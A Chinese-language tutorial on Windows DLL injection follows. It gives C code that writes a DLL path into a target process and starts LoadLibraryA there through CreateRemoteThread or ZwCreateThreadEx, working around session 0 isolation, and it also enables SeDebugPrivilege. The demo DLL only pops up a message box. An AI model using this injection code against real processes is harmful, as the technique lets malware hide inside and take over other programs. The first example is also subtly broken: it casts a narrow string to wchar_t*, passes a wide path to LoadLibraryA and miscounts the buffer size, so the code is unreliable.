实现过程

1、获取LoadLibrary函数的地址，对于kernel32.dll的加载基址在每个进程中都是相同的，所以我们能获取LoadLibrary函数的地址。
2、调用VirtualAllocEx函数向目标进程空间申请一块内存。
3、调用WriteProcessMemory函数将指定的DLL路径写入到目标进程空间。
4、通过CreateRemoteThread函数加载LoadLibrary函数的地址，进行DLL注入。
实列代码
Default
#include <Windows.h>
#include <stdio.h>
 
BOOL CreateRemoteThreadInjectDll(DWORD dwProcessId, wchar_t *pszDllFileName) {
    HANDLE hProcess = NULL;
    DWORD dwSize = 0;
    LPVOID pDllAddr = NULL;
    FARPROC pFuncProcAddr = NULL;
 
    // 打开注入的进程
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL == hProcess) {
        printf("Error OpenProcess,%d", GetLastError());
        return FALSE;
    }
 
    // 在注入进程中申请内存
    dwSize = 1 + lstrlen(pszDllFileName);
    pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
    if (pDllAddr == NULL) {
        printf("Error VirtualAllocEx,%d", GetLastError());
        return FALSE;
    }
 
    // 向申请的内存中写入数据
    if (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) {
        printf("Error WriteProcessMemory,%d", GetLastError());
        return FALSE;
    }
 
    // 获取LoadLibraryA函数地址
    pFuncProcAddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (NULL == pFuncProcAddr) {
        printf("Error GetProcAddress,%d", GetLastError());
        return FALSE;
    }
 
    // CreateRemoteThreadc创建远程线程，实现dll注入
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL);
    if (NULL == hRemoteThread) {
        printf("Error CreateRemoteThread,%d", GetLastError());
        return FALSE;
    }
 
    CloseHandle(hProcess);
    return TRUE;
}
 
int main() {
    wchar_t* dllPath = (wchar_t*)"D:\\Dll1.dll";
    CreateRemoteThreadInjectDll(9956, dllPath);
    return 0;
}

DLL代码：
该DLL项目由vs2019生成，注入后自动弹出消息框
Default
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
 
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:{
        MessageBoxA(NULL, "Inject is OK!", "OK", MB_OK);
        break; 
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

突破session0隔离的远线程注入
函数声明（win64）
Default
DWORD WINAPI ZwCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    ULONG CreateThreadFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    LPVOID pUnkown
)
Default
#include "Windows.h"
#include <stdio.h>
 
BOOL ZwCreateThreadExInjectDLL(DWORD dwProcessId, const char* pszDllFileName) {
    HANDLE hProcess = NULL;
    SIZE_T dwSize = 0;
    LPVOID pDllAddr = NULL;
    FARPROC pFuncProcAddr = NULL;
    HANDLE hRemoteThread = NULL;
    DWORD dwStatus = 0;
 
    // 打开进程
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL == hProcess) {
        printf("Error OpenProcess:%d", GetLastError());
        return FALSE;
    }
 
    // 申请内存
    dwSize = 1 + ::lstrlen(pszDllFileName);
    pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
    if (pDllAddr == NULL){
        printf("Error VirtualAllocEx:%d", GetLastError());
         return FALSE;
    }
 
    // 写入数据
    if (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) {
        printf("Error WriteProcessMemory:%d", GetLastError());
        return FALSE;
    }
 
#ifdef _WIN64
    typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        LPVOID ObjectAttributes,
        HANDLE ProcessHandle,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        ULONG CreateThreadFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        LPVOID pUnkown);
#else
    typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        LPVOID ObjectAttributes,
        HANDLE ProcessHandle,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        BOOL CreateSuspended,
        DWORD dwStackSize,
        DWORD dw1,
        DWORD dw2,
        LPVOID pUnkown);
#endif
 
    // 加载ntdll.dll
    HMODULE hNtdllDll = LoadLibrary("ntdll.dll");
    if (NULL == hNtdllDll) {
        printf("Error Load 'ntdll.dll':%d", GetLastError());
        return FALSE;
    }
 
    // 获取LoadLibraryA函数地址
    pFuncProcAddr = GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (NULL == pFuncProcAddr) {
        printf("Error GetProcAddress 'LoadLibraryW':%d", GetLastError());
        return FALSE;
    }
 
    // 获取ZwCreateThreadEx函数地址
    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, "ZwCreateThreadEx");
    if (NULL == ZwCreateThreadEx) {
        printf("Error GetProcAddress 'ZwCreateThreadEx':%d", GetLastError());
        return FALSE;
    }
 
    // 使用ZwCreateThreadEx创建远线程，实现DLL注入
    dwStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL);
    if (NULL == hRemoteThread) {
        printf("Error Inject DLL:%u", dwStatus);
        return FALSE;
    }
    CloseHandle(hProcess);
    FreeLibrary(hNtdllDll);
 
    return TRUE;
}
 
// OpenProcess打开高权限的进程需要提权
BOOL EnbalePrivileges(HANDLE hProcess, const char* pszPrivilegesName)
{
     HANDLE hToken = NULL;
     LUID luidValue = { 0 };
     TOKEN_PRIVILEGES tokenPrivileges = { 0 };
     BOOL bRet = FALSE;
     DWORD dwRet = 0;
     // 打开进程令牌并获取进程令牌句柄
     bRet = ::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);
     if (FALSE == bRet)
     {
         printf("OpenProcessToken");
         return FALSE;
     }
     // 获取本地系统的 pszPrivilegesName 特权的LUID值
     bRet = ::LookupPrivilegeValue(NULL, pszPrivilegesName, &luidValue);
     if (FALSE == bRet){
         printf("LookupPrivilegeValue");
         return FALSE;
     }
     // 设置提升权限信息
     tokenPrivileges.PrivilegeCount = 1;
     tokenPrivileges.Privileges[0].Luid = luidValue;
     tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     // 提升进程令牌访问权限
     bRet = ::AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL);
     if (FALSE == bRet){
         printf("AdjustTokenPrivileges");
         return FALSE;
     }
     else{
         // 根据错误码判断是否特权都设置成功
         dwRet = ::GetLastError();
         if (ERROR_SUCCESS == dwRet){
             printf("SUCCESS!!");
             return TRUE;
         }
         else if (ERROR_NOT_ALL_ASSIGNED == dwRet){
             printf("ERROR_NOT_ALL_ASSIGNED");
             return FALSE;
         }
     }
     return FALSE;
 }
 
 
int main() {
    HANDLE hProcess = GetCurrentProcess();
    EnbalePrivileges(hProcess, SE_DEBUG_NAME);
 
    const char* dllPath = "E:\\Dll1.dll";
    ZwCreateThreadExInjectDLL(2940, dllPath);
    return 0;
}